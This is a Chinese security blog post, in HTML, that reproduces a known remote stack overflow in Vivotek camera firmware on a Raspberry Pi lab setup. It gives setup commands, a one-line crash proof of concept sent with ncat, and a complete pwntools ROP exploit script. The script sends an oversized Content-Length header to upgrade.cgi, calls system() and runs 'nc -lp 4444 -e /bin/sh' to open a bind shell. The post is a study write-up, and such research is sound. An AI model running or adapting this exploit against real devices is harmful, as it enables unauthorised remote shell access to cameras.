@@ -1,0 +1,109 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>vivotek远程栈溢出漏洞复现 | 0bs3rver的小屋</title><meta name="description" content="vivotek远程栈溢出漏洞复现"><meta name="keywords" content="pwn,IOT"><meta name="author" content="0bs3rver"><meta name="copyright" content="0bs3rver"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/坂本先生.jpeg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="vivotek远程栈溢出漏洞复现"><meta name="twitter:description" content="vivotek远程栈溢出漏洞复现"><meta name="twitter:image" content="http://yoursite.com/img/post.jpg"><meta property="og:type" content="article"><meta property="og:title" content="vivotek远程栈溢出漏洞复现"><meta property="og:url" content="http://yoursite.com/2020/11/16/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><meta property="og:site_name" content="0bs3rver的小屋"><meta property="og:description" content="vivotek远程栈溢出漏洞复现"><meta property="og:image" content="http://yoursite.com/img/post.jpg"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
+var t = Cookies.get("theme")
+if (autoChangeMode == '1'){
+  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined){
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport){
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour < 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+  }
+  } else if (t == 'light') activateLightMode()
+  else activateDarkMode()
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2020/11/16/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><link rel="prev" title="如何编写一个shellcode" href="http://yoursite.com/2020/11/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAshellcode/"><link rel="next" title="CVE-2017-17215-华为HG532命令注入漏洞分析" href="http://yoursite.com/2020/11/16/CVE-2017-17215-%E5%8D%8E%E4%B8%BAHG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: false
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isSidebar: true  
+  }</script><noscript><style>
+#page-header {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/坂本先生.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">17</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">15</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#raspberrypi下搭建"><span class="toc-number">1.</span> <span class="toc-text">raspberrypi下搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试"><span class="toc-number">2.</span> <span class="toc-text">调试</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/post.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">0bs3rver的小屋</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">vivotek远程栈溢出漏洞复现</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-11-16 19:54:17"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-11-16</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-11-16 19:54:48"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-11-16</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/IOT/">IOT</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><p>漏洞poc: <a href="https://www.exploit-db.com/exploits/44001" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44001</a></p>
+<p>主要参考这篇文章：<a href="https://xz.aliyun.com/t/5054" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054</a></p>
+<h2 id="raspberrypi下搭建"><a href="#raspberrypi下搭建" class="headerlink" title="raspberrypi下搭建"></a>raspberrypi下搭建</h2><p>首先下好环境</p>
+<p>漏洞固件和环境(感谢nop师傅)： <a href="https://pan.baidu.com/s/1l43s8MrRk1AiaDyuD4i5KQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1l43s8MrRk1AiaDyuD4i5KQ</a> 提取码：ke88</p>
+<p>环境扔过去后，还是需要 mount 来挂载，然后 chroot 来执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o bind &#x2F;dev .&#x2F;dev</span><br><span class="line">sudo mount -t proc &#x2F;proc .&#x2F;proc</span><br><span class="line">sudo chroot . .&#x2F;usr&#x2F;sbin&#x2F;httpd</span><br></pre></td></tr></table></figure>
+
+<p>mount命令是挂载命令，将前一个文件夹挂在到后一个，这样访问后一个就相当于访问前一个</p>
+<p>chroot命令用来在指定的根目录下运行指令。 chroot，即change root directory （更改root 目录）。 在linux 系统中，系统默认的目录结构都是以 / ，即是以根(root) 开始的。 而在使用chroot 之后，系统的目录结构将以指定的位置作为 / 位置。</p>
+<p>遇见报 <code>chroot: failed to run command &#39;./usr/sbin/httpd&#39; :  Permission denied</code> 时，需要用 chmod -R 给 usr bin lib 文件夹都赋权限。</p>
+<p>POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en &quot;POST &#x2F;cgi-bin&#x2F;admin&#x2F;upgrade.cgi HTTP&#x2F;1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n&quot;  | ncat -v 192.168.43.159 80</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>调试可以参考原文章</p>
+<p>关闭 aslr 时遇见一个问题，修改不了 /proc/sys/kernel/randomize_va_space ，权限是-rw-r–r– 1 root root 0 Oct 17 07:16 randomize_va_space，但是root和chmodt改不了，pi和root用户下用lsattr和chattr都会报错 chattr: Inappropriate ioctl for device while reading flags on randomize_va_space ，挂载情况是 proc on /proc type proc (rw,relatime)</p>
+<p>但是很匪夷所思的一点是，经过不断的尝试， su 情况下 echo 0 &gt; randomize_va_space 居然能写进去…</p>
+<p>如果有师傅知道这里是为啥，还请告知：<a href="mailto:wu.guang.zheng@qq.com">wu.guang.zheng@qq.com</a></p>
+<p>需要注意的是，原文章中 cat /proc/2949/maps 查看 libc 基址时，中间的数字是进程的 PID …吃了没技术的亏。</p>
+<p>经过调试，发现会在 system 下报 dumping core in /tmp 这个错，有点懵，但是ROP确实是成功了，附上截图，以后说不定用的上</p>
+<p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA-1.png"  alt=""></p>
+<p>这里下断点的地方是libc里的 system 地址（system_addr= libc_base + 0x47ab0），c之前是刚连上的寄存器内容，之后是断下来的寄存器内容，r0是 执行system 的参数，0xbeffe544内是需要执行的代码 nc -lp 4444 -e /bin/sh; ，我的树莓派好像没法执行这个命令，但是我更换成其他命令情况是一样的。</p>
+<p>大体上漏洞已经复现完了，最后的以后有机会再看吧…如果有师傅搞懂了这里是为啥，还请告知：<a href="mailto:wu.guang.zheng@qq.com">wu.guang.zheng@qq.com</a></p>
+<p>附上使用的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g1=<span class="number">0x00048784</span> <span class="comment">#: pop &#123;r1, pc&#125;</span></span><br><span class="line">g2=<span class="number">0x00016aa4</span> <span class="comment">#: mov r0, r1 ; pop &#123;r4, r5, pc&#125;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"192.168.43.159"</span>,<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">libc_base =  <span class="number">0xb6dd0000</span>   <span class="comment"># libC 库在内存中的加载地址</span></span><br><span class="line">command_addr = <span class="number">0xbeffe544</span> <span class="comment"># 要执行的代码地址</span></span><br><span class="line">system_addr= libc_base + <span class="number">0x47ab0</span> <span class="comment"># 0xb6e17ab0</span></span><br><span class="line"></span><br><span class="line">g1=libc_base+g1</span><br><span class="line">g2=libc_base+g2</span><br><span class="line">prefix=<span class="string">"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:"</span></span><br><span class="line">command=<span class="string">"nc -lp 4444 -e /bin/sh;"</span></span><br><span class="line">payload=<span class="string">'aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz'</span></span><br><span class="line">payload=payload+p32(g1)+p32(command_addr)+p32(g2)+<span class="string">'a'</span>*<span class="number">8</span>+p32(system_addr)</span><br><span class="line">payload=prefix+payload+command+<span class="string">"nrnrn"</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">0bs3rver</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/11/16/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">http://yoursite.com/2020/11/16/vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">0bs3rver的小屋</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/IOT/">IOT</a></div><div class="post_share"><div class="social-share" data-image="/img/post.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/11/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAshellcode/"><img class="prev_cover lazyload" data-src="/img/post.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">如何编写一个shellcode</div></div></a></div><div class="next-post pull_right"><a href="/2020/11/16/CVE-2017-17215-%E5%8D%8E%E4%B8%BAHG532%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><img class="next_cover lazyload" data-src="/img/post.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2017-17215-华为HG532命令注入漏洞分析</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/11/16/CVE-2017-17215-华为HG532命令注入漏洞分析/" title="CVE-2017-17215-华为HG532命令注入漏洞分析"><img class="relatedPosts_cover lazyload"data-src="/img/post.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-11-16</div><div class="relatedPosts_title">CVE-2017-17215-华为HG532命令注入漏洞分析</div></div></a></div><div class="relatedPosts_item"><a href="/2020/04/18/GUESS-fork相关/" title="GUESS-fork相关"><img class="relatedPosts_cover lazyload"data-src="/img/post.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-04-18</div><div class="relatedPosts_title">GUESS-fork相关</div></div></a></div><div class="relatedPosts_item"><a href="/2020/04/13/网鼎杯2018-pwn-GUESS-StackSmash/" title="网鼎杯2018-pwn-GUESS-StackSmash"><img class="relatedPosts_cover lazyload"data-src="/img/post.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-04-13</div><div class="relatedPosts_title">网鼎杯2018-pwn-GUESS-StackSmash</div></div></a></div><div class="relatedPosts_item"><a href="/2020/07/18/double free与uaf/" title="double free与uaf"><img class="relatedPosts_cover lazyload"data-src="/img/post.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-07-18</div><div class="relatedPosts_title">double free与uaf</div></div></a></div><div class="relatedPosts_item"><a href="/2020/11/19/如何编写一个shellcode/" title="如何编写一个shellcode"><img class="relatedPosts_cover lazyload"data-src="/img/post.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-11-19</div><div class="relatedPosts_title">如何编写一个shellcode</div></div></a></div></div><div class="clear_both"></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By 0bs3rver</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script></body></html>
